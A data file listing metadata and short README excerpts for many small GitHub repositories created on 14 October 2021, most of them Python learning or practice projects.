id;name;url;language;created;stars;watch;forks;readme
417092394;Python;https://github.com/Srinath-sirpangi/Python;Python;2021-10-14T10:50:18Z;0;0;0;Python 
417052007;Python;https://github.com/sharmil01/Python;Python;2021-10-14T08:35:23Z;0;0;0;
417083542;python;https://github.com/mricot/python;;2021-10-14T10:18:27Z;0;0;0;
417098380;Python;https://github.com/rlcunha/Python;Python;2021-10-14T11:11:00Z;0;0;0;
417077438;Python;https://github.com/FilipRusiecki/Python;Python;2021-10-14T09:57:45Z;0;0;0;Python 
417107250;Python;https://github.com/LauraBlancoNunez/Python;;2021-10-14T11:42:08Z;0;0;0;Python Ciència de Dades amb Python - Nivell avançat He creat l'entorn de GitHub per pujar els exercicis 
417185848;Python;https://github.com/yzhao-5/Python;;2021-10-14T15:32:51Z;0;0;0;
417174307;python;https://github.com/Asif6/python;Python;2021-10-14T15:00:48Z;0;0;0;python 
417084973;python;https://github.com/maksym-21/python;Python;2021-10-14T10:23:44Z;0;0;0;
417142237;Python;https://github.com/otavio-code/Python;Python;2021-10-14T13:31:12Z;0;0;0;
417049234;python;https://github.com/min-son/python;Python;2021-10-14T08:26:30Z;0;0;0;
417120068;Python;https://github.com/AlexCanel/Python;Python;2021-10-14T12:24:10Z;0;0;0;
417083306;python;https://github.com/liamkim1109/python;;2021-10-14T10:17:37Z;0;0;0;
417116979;python;https://github.com/NNCDavid/python;;2021-10-14T12:14:07Z;0;0;0;python This is a test! #1 ##2 ###3 
417175176;Python;https://github.com/wonntann/Python;;2021-10-14T15:02:46Z;0;0;0;Python Python lessons 
417130227;Python;https://github.com/sang2770/Python;Python;2021-10-14T12:55:47Z;0;0;0;
417106962;Python;https://github.com/hwangjk95/Python;Python;2021-10-14T11:41:10Z;0;0;0;
417157183;Python;https://github.com/YARDSKY/Python;Python;2021-10-14T14:13:54Z;0;0;0;Python all python projects will be publsihed right here 
417069881;python;https://github.com/ly-rgb/python;Python;2021-10-14T09:32:01Z;0;0;0;
417143584;Python;https://github.com/Geetanjali0087/Python;Jupyter Notebook;2021-10-14T13:35:14Z;0;0;0;Movies 
417069000;python;https://github.com/Ignotron/python;;2021-10-14T09:29:23Z;0;0;0;python Programs 
417084431;python;https://github.com/imChinoook/python;Python;2021-10-14T10:21:49Z;0;0;0;
417129240;PYTHON;https://github.com/klebervieirati/PYTHON;Python;2021-10-14T12:52:45Z;0;0;0;PYTHON TESTE GITHUB 
417117018;Python;https://github.com/HarrisonBennett14/Python;;2021-10-14T12:14:15Z;0;0;0;Python 
417084982;python;https://github.com/charlesneimog/python;Python;2021-10-14T10:23:46Z;0;0;0;python  Python codes. 
417142476;PYTHON;https://github.com/alpha0212/PYTHON;Python;2021-10-14T13:31:56Z;0;0;0;PYTHON 
417151018;python;https://github.com/creativeabhi13/python;Python;2021-10-14T13:56:30Z;0;0;0;
417195061;Python;https://github.com/igggiRUS/Python;;2021-10-14T16:00:10Z;0;0;0;
417093364;PYTHON;https://github.com/Ayan-MJ/PYTHON;;2021-10-14T10:53:50Z;0;0;0;PYTHON 
417141210;Python;https://github.com/Erraticoye/Python;Python;2021-10-14T13:28:06Z;0;0;0;Python 
417188428;python;https://github.com/CarlosEduardoLemos/python;Python;2021-10-14T15:40:30Z;0;0;0;python Curso de python do Curso em Vídeo 
417171516;python-faker;https://github.com/victoraugusto6/python-faker;Python;2021-10-14T14:53:08Z;2;2;0;python-faker Using Faker in Python Doc: https://faker.readthedocs.io/en/master/  
417081535;Discord-RPC-With-Python;https://github.com/Kazdev0/Discord-RPC-With-Python;Python;2021-10-14T10:11:14Z;2;2;0;Discord-RPC-With-Python- Discord Rpc With Python And 2 Buttons Packages pypresence   time Required Programs Python Latest Version  Random IDE  Discord :P Contact Discord Server 
417065628;InvestOps;https://github.com/Hvass-Labs/InvestOps;Python;2021-10-14T09:19:25Z;3;3;0;InvestOps Stay tuned, coming soon to a cinema near you! 
417106775;PythonProjects;https://github.com/robytoby154/PythonProjects;Python;2021-10-14T11:40:28Z;0;0;0;PythonProjects A collection of my projects written in Python 3.0, raw free-to-use content 
417165832;PythonUniversity;https://github.com/JavierGalindoToledo/PythonUniversity;Python;2021-10-14T14:37:23Z;0;0;0;PythonUniversity 
417113166;pythonProject;https://github.com/TAAVOER4/pythonProject;;2021-10-14T12:01:51Z;0;0;0;
417189252;pythonProject;https://github.com/piotrzw/pythonProject;Python;2021-10-14T15:42:57Z;0;0;0;
417168096;python01;https://github.com/yaplatonov/python01;Python;2021-10-14T14:43:40Z;0;0;0;python01 python01 
417130703;PythonLessons;https://github.com/JosephinePrice/PythonLessons;Jupyter Notebook;2021-10-14T12:57:09Z;0;0;0;
417158584;pythonLabs;https://github.com/ant1kkkk/pythonLabs;Python;2021-10-14T14:17:56Z;0;0;0;
417189240;pythonProject;https://github.com/Pitigoi94/pythonProject;;2021-10-14T15:42:55Z;0;0;0;
417046821;Python19;https://github.com/SaraswathiDevi4/Python19;;2021-10-14T08:19:00Z;0;0;0;Python19 
417116808;pythonProject;https://github.com/Maskka1/pythonProject;;2021-10-14T12:13:33Z;0;0;0;
417065793;pythonProject;https://github.com/yusufpersonal1/pythonProject;;2021-10-14T09:19:59Z;0;0;0;
417142754;PythonCreate;https://github.com/TsurugiIeyama/PythonCreate;Python;2021-10-14T13:32:45Z;0;0;0;PythonCreate my study tracking 
417153954;PythonAutomation;https://github.com/Wiinai/PythonAutomation;;2021-10-14T14:04:39Z;0;0;0;PythonAutomation 21Days-PythonAutomation 
417191999;PythonPortfolio;https://github.com/Skrillybrick/PythonPortfolio;;2021-10-14T15:51:01Z;0;0;0;
417139408;PythonSort;https://github.com/JakubBarabasz/PythonSort;Python;2021-10-14T13:22:50Z;0;0;0;PythonSort Bubble, Quick, Insertion 
417106747;Python33;https://github.com/IsmailEmreDogan/Python33;Python;2021-10-14T11:40:23Z;0;0;0;
417056750;PythonBook;https://github.com/RPriednieks/PythonBook;Python;2021-10-14T08:51:08Z;0;0;0;
417188670;pythonProject;https://github.com/DragosJohnSirbu/pythonProject;;2021-10-14T15:41:15Z;0;0;0;
417056068;pythonProject;https://github.com/ikomilov/pythonProject;Python;2021-10-14T08:48:49Z;0;0;0;
417140391;pythonDSA;https://github.com/AdriCali/pythonDSA;Python;2021-10-14T13:25:40Z;0;0;0;
417052763;pythonProject;https://github.com/WIUT00011173/pythonProject;Python;2021-10-14T08:37:49Z;0;0;0;
417106333;Python32;https://github.com/IsmailEmreDogan/Python32;Python;2021-10-14T11:38:54Z;0;0;0;
417076241;PythonProjects;https://github.com/krvishal07/PythonProjects;;2021-10-14T09:53:41Z;0;0;0;PythonProjects In this repo i will add all project related to python. 
417048243;pythonNotes;https://github.com/songyq15/pythonNotes;;2021-10-14T08:23:29Z;0;0;0;pythonNotes 这个仓库主要记录学习python过程中的一些笔记。 
417175512;pythonProject;https://github.com/AleksHertzz/pythonProject;Python;2021-10-14T15:03:34Z;0;0;0;
417092392;pythoncode1;https://github.com/rangeela1995/pythoncode1;Python;2021-10-14T10:50:17Z;0;0;0;
417125184;pythonMQ;https://github.com/AntonScheitler/pythonMQ;Python;2021-10-14T12:40:11Z;0;0;0;
417159570;pythonStudy;https://github.com/Kent1004/pythonStudy;Python;2021-10-14T14:20:37Z;0;0;0;pythonStudy 
417082084;pythonOOP;https://github.com/jasimibos/pythonOOP;;2021-10-14T10:13:11Z;0;0;0;
417144701;PythonCoding;https://github.com/kuiba3903/PythonCoding;Python;2021-10-14T13:38:33Z;0;0;0;"""# PythonCode"" some tools you may use when doing coding exercises. for more information，visit http://www.fengxaio.ltd/view/35/ "
417057894;pythonProject;https://github.com/Sardor00011169/pythonProject;Python;2021-10-14T08:54:52Z;0;0;0;
417137691;PythonProject;https://github.com/musaib01/PythonProject;;2021-10-14T13:17:35Z;1;1;0;
417090827;PythonWorkspace;https://github.com/choi-jiseong/PythonWorkspace;Python;2021-10-14T10:44:42Z;0;0;0;
417053110;PythonSSH;https://github.com/programmingrakesh/PythonSSH;Python;2021-10-14T08:39:05Z;0;0;0;PythonSSH Anybody Please Rectify This error. cd .. is Not working. Video Link: https://www.youtube.com/channel/UC47gPgiey3fTpG1ifDxoyNQ 
417085926;Python101;https://github.com/Adekoje/Python101;Python;2021-10-14T10:27:07Z;0;0;0;
417053621;pythonProject;https://github.com/kunqin1/pythonProject;Python;2021-10-14T08:40:50Z;0;0;0;
417182635;PythonWorkspace;https://github.com/isbnone/PythonWorkspace;Python;2021-10-14T15:23:17Z;0;0;0;
417178108;Seam-Carving-Algorithm-With-Python;https://github.com/HamidullahTurkmen/Seam-Carving-Algorithm-With-Python;Jupyter Notebook;2021-10-14T15:10:25Z;2;2;0;Seam-Carving-Algorithm-With-Python Seam carving, also known as content-aware image resizing, is one of the methods for adjusting the image size such that the content of the image will be preserved. Image resizing is used to handle different resolutions between modules of various device screens and applications. It can also be used intentionally to corrupt or remove the original content of the image. Therefore, it is of great importance to detect external interference with the images. 
417132528;pythonProject1;https://github.com/aneeshPotomac/pythonProject1;;2021-10-14T13:02:32Z;0;0;0;
417115502;pythonForNew;https://github.com/luoshengyue/pythonForNew;;2021-10-14T12:09:09Z;0;0;0;
417189981;pythonProject_1;https://github.com/Pitigoi94/pythonProject_1;;2021-10-14T15:45:06Z;0;0;0;
417110714;Python3Michigan;https://github.com/danchamorro/Python3Michigan;Python;2021-10-14T11:54:00Z;0;0;0;Python 3 Michigan State Coursera Certification 
417088339;pythonProject1;https://github.com/absorber2018/pythonProject1;Python;2021-10-14T10:35:55Z;0;0;0;
417158521;PythonTraining-Tibil;https://github.com/amal-antony/PythonTraining-Tibil;Python;2021-10-14T14:17:45Z;0;0;0;PythonTraining-Tibil Everything related to Training in Python from Tibil 
417062414;pythonProject2;https://github.com/Sardor00011169/pythonProject2;Python;2021-10-14T09:09:32Z;0;0;0;
417121826;pythonProject2;https://github.com/AntonFender/pythonProject2;Python;2021-10-14T12:29:29Z;0;0;0;
417191976;pythonProject11;https://github.com/Stefan05/pythonProject11;Python;2021-10-14T15:50:57Z;0;0;0;
417176969;PythonDjangoWeb;https://github.com/hungboww/PythonDjangoWeb;Python;2021-10-14T15:07:22Z;0;0;0;
417163885;awesome-python3-webapp;https://github.com/sm-smi/awesome-python3-webapp;;2021-10-14T14:32:13Z;0;0;0;
417062410;pythonProject1;https://github.com/AntonFender/pythonProject1;Python;2021-10-14T09:09:32Z;0;0;0;
417147873;pythonProject1;https://github.com/mn987/pythonProject1;;2021-10-14T13:47:44Z;0;0;0;
417119036;pythonTowerOfHanoi;https://github.com/JohnThunderr/pythonTowerOfHanoi;;2021-10-14T12:20:54Z;0;0;0;
417118093;pythonProject2;https://github.com/Maskka1/pythonProject2;;2021-10-14T12:17:43Z;0;0;0;
417195162;PythonAdv_Ora4;https://github.com/Laky730/PythonAdv_Ora4;Python;2021-10-14T16:00:31Z;0;0;0;
417098565;pythonToArduino;https://github.com/Angelus123/pythonToArduino;Python;2021-10-14T11:11:40Z;0;0;0;
417194743;pythonProject2;https://github.com/KishanRaj-Zoetis/pythonProject2;;2021-10-14T15:59:14Z;0;0;0;
417054899;pythonAPP-pymatgen-get-data-from-materialsproject;https://github.com/Hsinyuan0108/pythonAPP-pymatgen-get-data-from-materialsproject;Python;2021-10-14T08:45:14Z;1;1;0;pythonAPP-pymatgen-get-data-from-material-projects 在https://materialsproject.org/获取你的API KEY 将API KEY 输入到API_KEY.txt中 pip install -r requirements.txt 安装必须的库 程序有两种运行方式 APP / CMD APP 运行方式 ： python start.py -m APP CMD 运行方式 ： python start.py -m CMD -f (txt 文件) 如 1.txt txt文件中可以有多个mpid，用,分开 CMD模式会直接获得所有mpid对应的物质的数据并保存 在APP模式下获得的数据不会全部展示 但是会全部保存在mpid同名文件夹下 
417176091;PythonPOO_DavidQuesada_2DAM;https://github.com/dquejim/PythonPOO_DavidQuesada_2DAM;Python;2021-10-14T15:05:05Z;0;0;0;
417114707;python3---version-pip3---version;https://github.com/uugoiuo/python3---version-pip3---version;Java;2021-10-14T12:06:45Z;0;0;0;"Apktool This is the repository for Apktool. If you are looking for the Apktool website. Click here.    It is a tool for reverse engineering 3rd party, closed, binary Android apps. It can decode resources to nearly original form and rebuild them after making some modifications; it makes possible to debug smali code step by step. Also it makes working with app easier because of project-like files structure and automation of some repetitive tasks like building apk, etc. It is NOT intended for piracy and other non-legal uses. It could be used for localizing, adding some features or support for custom platforms and other GOOD purposes. Just try to be fair with authors of an app, that you use and probably like. Support  Project Page #apktool on libera.chat  Sponsored by  Sourcetoad - helping with a weekly sponsorship for continued improvement and maintenance of the project.  IDE of Choice  JetBrains IntelliJ  Security Vulnerabilities If you discover a security vulnerability within Apktool, please send an e-mail to Connor Tumbleson at connor.tumbleson(at)gmail.com. All security vulnerabilities will be promptly addressed. Links  Downloads Downloads Mirror How to Build Documentation Bug Reports Chat on Gitter Changelog/Information XDA Post Source (Github) Source (Bitbucket)  "
417117814;pythonscraping;https://github.com/xiecanlin/pythonscraping;Python;2021-10-14T12:16:51Z;0;0;0;pythonscraping 
417098517;pythonsearch;https://github.com/diangamichael/pythonsearch;;2021-10-14T11:11:29Z;0;0;0;pythonsearch 
417071931;pythonbot;https://github.com/Philosof-k/pythonbot;Dockerfile;2021-10-14T09:38:46Z;0;0;0;pythonbot docker python for bot 
417175886;pythonapp;https://github.com/robece/pythonapp;Python;2021-10-14T15:04:37Z;0;0;0;
417072470;pythoncodes;https://github.com/mohana-sai/pythoncodes;Python;2021-10-14T09:40:34Z;0;0;0;
417047742;pythonchallenges;https://github.com/melanieteoh/pythonchallenges;;2021-10-14T08:21:55Z;0;0;0;pythonchallenges 
417093558;pythonuserbot;https://github.com/ChryS43/pythonuserbot;Python;2021-10-14T10:54:33Z;0;0;0;
417189578;code_snips;https://github.com/acmpesuecc/code_snips;Jupyter Notebook;2021-10-14T15:43:56Z;2;2;5;Code_snips(Cap of 5 pull requests on the entire repository during the boost period.) Take a look at the ISSUE #1 before planning to submit your PR. It is one PR limited to one individual. This repository's aims to accept beginner friendly submissions and accepts medium sized scripts of code which can be used elsewhere example:- Text_to_speech Speech_to_text These particular python codes can be utilised in a larger python code-base that needs these for increasing interactivity on a website or making a personal assistant.  These BP can be altered depending on the code's complexity, length and usefullness  Uses:-   1. A collection of helpful code snippets.I have made that can be used for larger programs.    Open for users to contribute to the codebase so as to help each other out.Algorithms, Object detection algorithms,machine learning algorithms for AI/ML.   Basic templates and short codes to allow for creation of web-page elements as well as larger code scripts.    For example:-    The text_to_speech and speech_to_text codes can be used in a website so as to allow hearing impaired individuals to communicate their thoughts.   This can be inserted into a larger codebase for a larger set of individuals with different disabilities.   This could also used in websites so as to add extra functionality and cool features.   Parameters for bounty point allocation (Mandatory rules to be followed) :-    If you are submitting an AI/Model then you must specify the efficiency of the models.   Length of the code must not be lesser than 20 lines or greater than 200 lines unless explained to the maintainer why the code is in the spirit of this repository.   Must include Sufficient comments on your code for others to understand your script.   Also at the end of the file in comments please do indicate the uses of your script.   Examples of low quailty contributions:-  Note that your PR's will be scrutanised heavily if they follow the parameters and is limited to one PR per participant.   Pull requests that are automated e.g. scripted opening pull requests to remove whitespace / fix typos / optimize images.   Pull requests that are disruptive e.g. taking someone else's branch/commits and making a pull request.   Pull requests that are regarded by a project maintainer as a hindrance vs. helping.   Something that's clearly an attempt to simply +1 your pull request count for October.   Last but not least, one pull request to fix a typo is fine, but 5 pull requests to remove a stray whitespace is not.   Proof of when the repo was made 
417122516;file;https://github.com/Mub16/file;Python;2021-10-14T12:31:45Z;0;0;0;
417052171;Introduction-to-python;https://github.com/KaigaMunene/Introduction-to-python;Python;2021-10-14T08:35:53Z;0;0;0;Introduction-to-python python 
417123977;win_python3.9.7_tensorflow2.6.0;https://github.com/thexl74/win_python3.9.7_tensorflow2.6.0;Jupyter Notebook;2021-10-14T12:36:10Z;0;0;0;win_python3.9.7_tensorflow2.6.0 'tensorflow-2.6.0-cp39-cp39-win_amd64.whl' is not included(>400MB). pip install --no-index --find-links ./packages -r requirements.txt import tensorflow as tf import numpy as np  def load_data(path):     with np.load(path) as f:         x_train, y_train = f['x_train'], f['y_train']         x_test, y_test = f['x_test'], f['y_test']         return (x_train, y_train), (x_test, y_test)  (x_train, y_train), (x_test, y_test) = load_data('./inputs/mnist.npz')  model = tf.keras.models.Sequential([   tf.keras.layers.Flatten(input_shape=(28, 28)),   tf.keras.layers.Dense(128, activation='relu'),   tf.keras.layers.Dropout(0.2),   tf.keras.layers.Dense(10, activation='softmax') ])  model.compile(optimizer='adam',               loss='sparse_categorical_crossentropy',               metrics=['accuracy'])  model.fit(x_train, y_train, epochs=5)  model.evaluate(x_test,  y_test, verbose=2) 
417068747;Python-3;https://github.com/AbhiraamDasari/Python-3;Python;2021-10-14T09:28:37Z;0;0;0;Python-3 
417094845;python-mongodb;https://github.com/ATOMICMAN007/python-mongodb;;2021-10-14T10:59:17Z;0;0;0;python-mongodb Trying MongoDB using Python. 
417179398;Python-Grind;https://github.com/Tukai-Dal/Python-Grind;Jupyter Notebook;2021-10-14T15:13:54Z;0;0;0;Python-Grind Python - Data Structures and Algorithms Revision 
417173013;Python-Pratice;https://github.com/dendifz/Python-Pratice;Python;2021-10-14T14:57:18Z;0;0;0;
417042964;Python-Project;https://github.com/Abdullah-1998/Python-Project;Python;2021-10-14T08:06:33Z;0;0;0;Python-Project About This short code challenge can help the local zoo look after its denizens. You will create a tool for monitoring animals and their status. Learning outcomes This project is aimed at our beginners. It helps you understand some syntax basics and learn how to work with variables, data storage types such as lists, and while loops. 
417124046;minimal-python;https://github.com/budzow/minimal-python;Python;2021-10-14T12:36:20Z;0;0;0;
417088759;python-cheatsheet;https://github.com/Rashad-j/python-cheatsheet;Python;2021-10-14T10:37:27Z;0;0;0;python-cheatsheet This repository provides a quick cheatsheet with code examples. 
417186322;Ejercicio_Python;https://github.com/AlejandroRuizP/Ejercicio_Python;Python;2021-10-14T15:34:15Z;0;0;0;Ejercicio1 
417079941;python_behave;https://github.com/taimuraamer/python_behave;Python;2021-10-14T10:05:46Z;0;0;0;Environment Setup   Setup  Install the dependencies pip install -r requirements.txt      Running Tests  To run a single test, run behave features/signle.feature  
417096531;Python-works;https://github.com/Karel63/Python-works;Python;2021-10-14T11:04:50Z;0;0;0;
417047716;python_challenges;https://github.com/nicocheong05/python_challenges;;2021-10-14T08:21:50Z;0;0;0;python_challenges 
417057114;python_training;https://github.com/Yanaalekseevna/python_training;;2021-10-14T08:52:13Z;0;0;0;python_training 
417071011;MontePython;https://github.com/agk30/MontePython;Python;2021-10-14T09:35:41Z;0;0;0;MontePython Monte Carlo scattering simulation, this time in python. 
417171256;my-python;https://github.com/georgiev-ventsi/my-python;Python;2021-10-14T14:52:24Z;0;0;0;my-python 
417060083;Python_lesson;https://github.com/atsukun0426/Python_lesson;Jupyter Notebook;2021-10-14T09:01:42Z;0;0;0;
417089499;Project_python;https://github.com/ppraecha/Project_python;Python;2021-10-14T10:40:03Z;0;0;0;Project_python 
417081906;learrnPython;https://github.com/adil-ahmed/learrnPython;Python;2021-10-14T10:12:33Z;0;0;0;
417148214;python-practice;https://github.com/umer-rukhsar/python-practice;Python;2021-10-14T13:48:42Z;0;0;0;python-practice My Python Practice 
417189623;python-programs;https://github.com/jerryjohn1995/python-programs;Python;2021-10-14T15:44:04Z;0;0;0;python-programs 
417158945;hangman_python;https://github.com/ak2489/hangman_python;Python;2021-10-14T14:18:56Z;0;0;0; User Experience User Stories First Time Visitor Goals a. As a first time visitor, I want to be able to start the game easily. b. As a first time visitor, I want to be challenged by the game. c. As a first time visitor, I want to be able to run the game again easily so i can keep playing. Returning Visitor Goals a. As a returning visitor, I want to continue to be challenged. b. As a returning visitor, I want there to be lots of words so I do not have a chance of having the same word twice. c. As a returning visitor, I want the experience to run exactly the same. Design   Command line game that has the hangman frame in the centre of the screen and the first game already loaded.  
417171247;NOJ-python;https://github.com/deathbegin/NOJ-python;Jupyter Notebook;2021-10-14T14:52:23Z;0;0;0;NOj-python NWPU 高级python程序设计oj题目 
417137572;Python_study;https://github.com/Paul2021-R/Python_study;;2021-10-14T13:17:14Z;0;0;0;Python_study 
417071515;Python_study;https://github.com/JuliaTSY/Python_study;Python;2021-10-14T09:37:21Z;0;0;0;
417130408;DES-python;https://github.com/lolonogales/DES-python;;2021-10-14T12:56:19Z;0;0;0;DES-python 
417162035;python-api;https://github.com/Diegogl91/python-api;Python;2021-10-14T14:27:13Z;0;0;0;"     🐍 Python API Requests Tutorial and Exercises By @alesanchezr and other contributors at 4Geeks Academy        In this series you will Learn HTTP and how to use the Python Requests package to create HTTP Requests GET, POST, PUT, DELETE. The entire tutorial is 👆 interactive, ✅ auto-graded and with. 📹 video tutorials. 📚 Table of contents:   1. Python for Beginners   2. Practice Looping Lists and Tuples 3. Practice functions 4. Master Python (intermediate) 5. Python API Requests ← 🔥 your are here now   6. What next? Request a new tutorial or collaborate. We will feature your profile in our list of contributors  These exercises were built in collaboration, we need you! If you find any bugs or misspells plese contribute and report them. One click installation:  Local Installation  Install learnpack, the package manager for learning tutorials and the html compiler plugin for learnpack, make sure you also have node.js 12+:  $ npm i learnpack -g $ learnpack plugins:install learnpack-python   Download this particular exercise using learnpack and cd into the folder:  $ learnpack download python-http-requests-api-tutorial-exercises $ cd python-http-requests-api-tutorial-exercises  Note: Once you finish downloading, you will find a ""exercises"" folder that contains all the exercises within.  Start the tutorial/exercises by running the following command at the same level were your bc.json file is:  $ pip install pytest==4.4.2 mock pytest-testdox $ learnpack start Note: The exercises have automatic grading but its very rigid and string, my recomendation is to ignore the tests and use them only as a recomendation or you can get frustrated. How are the exercises organized? Each exercise is a small react application containing the following files:  app.py: represents the entry python file that will be executed by the computer. README.md: contains exercise instructions. test.py: you don't have to open this file, it contains the testing script for the exercise.  Contributors Thanks goes to these wonderful people (emoji key):  Alejandro Sanchez (alesanchezr), contribution: (coder) 💻 (idea) 🤔, (build-tests) ⚠️, (pull-request-review) 👀 (build-tutorial) ✅ (documentation) 📖 Paolo (plucodev), contribution: (bug reports) 🐛, contribution: (coder), (translation) 🌎  This project follows the all-contributors specification. Contributions of any kind are welcome! "
417092920;Python_Scripts;https://github.com/antonio2505/Python_Scripts;Python;2021-10-14T10:52:08Z;0;0;0;All Scripts in python, (Helpers Functions) Data Science, Machine Learning, Deep Learning... 
417060673;python-parser;https://github.com/rdmsh/python-parser;;2021-10-14T09:03:40Z;0;0;0;
417086122;python_basics;https://github.com/qyuliyan/python_basics;;2021-10-14T10:27:47Z;0;0;0;
417062719;Python_lesson;https://github.com/xiangyuzi/Python_lesson;Python;2021-10-14T09:10:32Z;0;0;0;
417060672;python-scripts;https://github.com/kuyrathdaro/python-scripts;Python;2021-10-14T09:03:40Z;0;0;0;
417091362;20211014python;https://github.com/xvpowerg/20211014python;;2021-10-14T10:46:40Z;0;0;0;20211014python 20211014　AI與python 
417043596;Python-Scripts;https://github.com/AnvarKalykov/Python-Scripts;Python;2021-10-14T08:08:52Z;0;0;0;
417097351;Python-Practices;https://github.com/mdshaharulislampavel/Python-Practices;;2021-10-14T11:07:42Z;0;0;0;
417097217;Python-Practice;https://github.com/ShekharGaikwadDS/Python-Practice;;2021-10-14T11:07:16Z;0;0;0;
417112871;python-homework;https://github.com/maria-josa/python-homework;;2021-10-14T12:00:59Z;0;0;0;python-homework 
417050676;Atom-Python;https://github.com/RegalQuail/Atom-Python;Python;2021-10-14T08:30:58Z;0;0;0;Atom-Python 
417169625;Python_matplotlib;https://github.com/ZJY86/Python_matplotlib;Python;2021-10-14T14:47:50Z;0;0;0;Python_matplotlib python绘图库matplotlib 记录matplotlib学习代码 
417140650;Python-training;https://github.com/Vijaychandra-7781/Python-training;;2021-10-14T13:26:23Z;0;0;0;Python-training 
417090919;IMC_Python;https://github.com/DaviGFiguer/IMC_Python;Python;2021-10-14T10:45:04Z;0;0;0;
417156623;Matin-Python;https://github.com/matin321/Matin-Python;Python;2021-10-14T14:12:21Z;0;0;0;Matin-Python 
417136086;Python_Programs;https://github.com/jignesh-kothari/Python_Programs;Python;2021-10-14T13:12:58Z;0;0;1;
417150769;Learning_python;https://github.com/Pythoncoding5/Learning_python;Python;2021-10-14T13:55:50Z;0;0;0;Learning_python My journey towards python expert 
417075080;understanding-python;https://github.com/osamayy515/understanding-python;Jupyter Notebook;2021-10-14T09:49:36Z;0;0;0;understanding-python some basic operations with their examples in python 
417076999;Python-basic;https://github.com/sg-nm/Python-basic;Jupyter Notebook;2021-10-14T09:56:17Z;0;0;0;Python-basic 
417137958;Python-course;https://github.com/ico2k2developer/Python-course;Python;2021-10-14T13:18:23Z;0;0;0;
417052436;python-basics;https://github.com/saqlainawan/python-basics;;2021-10-14T08:36:41Z;0;0;0;
417057942;Python-Programs;https://github.com/Agrawal05/Python-Programs;;2021-10-14T08:55:00Z;1;1;0;
417154170;python-server;https://github.com/zdrwiley/python-server;Python;2021-10-14T14:05:16Z;0;0;0;
417073308;TestPython;https://github.com/imranshakeelkhans/TestPython;;2021-10-14T09:43:16Z;0;0;0;
417122905;threads_python;https://github.com/Artem100/threads_python;Python;2021-10-14T12:32:59Z;0;0;0;
417159314;python-challenge;https://github.com/nfiles/python-challenge;Rust;2021-10-14T14:19:56Z;0;0;0;python-challenge solutions to http://www.pythonchallenge.com/ 
417166333;introducao_python;https://github.com/gabcrrstt/introducao_python;Python;2021-10-14T14:38:55Z;0;0;0;Aprimorando os conhecimentos em python 
417097008;python-practices;https://github.com/panyoriokome/python-practices;;2021-10-14T11:06:30Z;0;0;0;python-practices 
417190051;python_websocket;https://github.com/zhengebushuai/python_websocket;;2021-10-14T15:45:17Z;0;0;0;python_websocket 
417091706;python-vohlc;https://github.com/paulschick/python-vohlc;Python;2021-10-14T10:47:53Z;0;0;0;Python VOHLC Version 0.0.1  Creates Volume-based candlesticks from time-based ohlcv data retrieved from cryptocurrency exchanges.  Output can be either sqlite or csv (for version 0.0.1) Primarily just a utility for something that I'm working on Should not be very complex. Keep it simple, just do what it needs to do Does not keep the timestamps Potentially give the option to not write the output, just keep in memory  Installation You may install from source, or install from pypi: pip install vohlc View on Pypi 
417165942;Python_Practice;https://github.com/KIMJUBA/Python_Practice;;2021-10-14T14:37:43Z;0;0;0;
417066634;Python_challenges;https://github.com/silvesray/Python_challenges;Python;2021-10-14T09:22:27Z;0;0;0;Python_challenges challenges 
417116394;python-programs;https://github.com/Mrutyunjay18/python-programs;;2021-10-14T12:12:05Z;0;0;0;
417076779;python-class;https://github.com/tom-zhu/python-class;Python;2021-10-14T09:55:32Z;0;0;0;python-class 
417078310;python_Tutorials;https://github.com/lungy666/python_Tutorials;;2021-10-14T10:00:32Z;0;0;0;python_Tutorials a tutorial is prepared for beginner who are goning to using python there will be some files open with jupyter notebook 
417083258;python-docker;https://github.com/lostdragon/python-docker;Dockerfile;2021-10-14T10:17:27Z;0;0;0;python with envconsul 
417106690;python_basic;https://github.com/HHHong10/python_basic;Python;2021-10-14T11:40:07Z;0;0;0;python_basic solving basic math probelm 
417120708;Python_Snake;https://github.com/TanZeus/Python_Snake;Python;2021-10-14T12:26:01Z;0;0;0;Python_Snake Just your usual python snake game. Contributors:  Tanish Bhandwalkar - scarlet4293@gmail.com  
417170946;moveit_python;https://github.com/uniudlabrobotica/moveit_python;Python;2021-10-14T14:51:28Z;0;0;0;moveit_python SHELL1: roslaunch franka_control franka_control.launch robot_ip:=172.16.0.2 load_gripper:=true SHELL2: roslaunch panda_moveit_config panda_moveit.launch controller:=position SHELL3 (opzionale): roslaunch panda_moveit_config moveit_rviz.launch python move_to_a_position.py 
417141696;Practicas-Python;https://github.com/PaulinaCando/Practicas-Python;;2021-10-14T13:29:35Z;0;0;0;
417168990;Python_Pandas;https://github.com/Jack748/Python_Pandas;;2021-10-14T14:46:10Z;0;0;0;
417190611;python-learn;https://github.com/meowto16/python-learn;;2021-10-14T15:46:52Z;0;0;0;Python  
417191595;universidad_python;https://github.com/zGack/universidad_python;Python;2021-10-14T15:49:42Z;0;0;0;universidad_python 
417175457;Practicing-Python;https://github.com/DivinityAhad/Practicing-Python;;2021-10-14T15:03:25Z;0;0;0;
417181942;python_basics;https://github.com/rizwan1721/python_basics;Python;2021-10-14T15:21:16Z;0;0;0;python_basics python basic codes 
417186201;EjerciciosPython;https://github.com/RicardoQ-Romeijn/EjerciciosPython;Python;2021-10-14T15:33:56Z;0;0;0;
417062837;Python-Stuff;https://github.com/flawlesscode254/Python-Stuff;Python;2021-10-14T09:10:54Z;0;0;0;
417132688;Sci-Python;https://github.com/abcefhd3212/Sci-Python;;2021-10-14T13:03:02Z;0;0;0;
417115620;python-basics;https://github.com/lcr1112/python-basics;;2021-10-14T12:09:31Z;0;0;0;
417109053;atcoder-python;https://github.com/ikmz0104/atcoder-python;;2021-10-14T11:48:22Z;0;0;0;
417073116;Numerical_python;https://github.com/wahlang/Numerical_python;Python;2021-10-14T09:42:40Z;0;0;0;Numerical_python To use this put in the same folder with your main file, import as a module using the command from Cheb import cheb You can extract the grid 'x' and first differentiation matrix D as x,D = cheb(a,b,N) where 'a' and 'b' are your grid end-points, and 'N' is the number of points that you want. 
417168691;Python-Projects;https://github.com/renanfameli/Python-Projects;;2021-10-14T14:45:19Z;0;0;0;
417171743;learning_python;https://github.com/Alexsandro-Ctba/learning_python;Python;2021-10-14T14:53:42Z;0;0;0;
417080396;MoocPython;https://github.com/lrrick/MoocPython;Python;2021-10-14T10:07:21Z;0;0;0;
417124094;python-template;https://github.com/negineri/python-template;;2021-10-14T12:36:29Z;0;0;0;python-template python template ライセンス MIT License 
417175698;python-sample;https://github.com/RameesRoshanck/python-sample;Python;2021-10-14T15:04:06Z;0;0;0;
